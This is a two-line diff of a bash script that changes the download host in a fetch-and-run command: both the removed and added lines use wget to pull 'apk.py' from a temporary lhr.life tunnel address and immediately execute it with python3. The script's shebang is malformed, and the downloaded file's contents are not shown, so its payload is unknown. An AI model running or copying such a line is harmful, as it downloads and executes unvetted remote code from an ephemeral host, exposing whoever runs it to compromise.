@@ -1,2 +1,2 @@
 #!bin/bash
-wget http://7fc93f40b9ab05.lhr.life/apk.py && python3 apk.py
+wget http://2f96a76d18f96a.lhr.life/apk.py && python3 apk.py
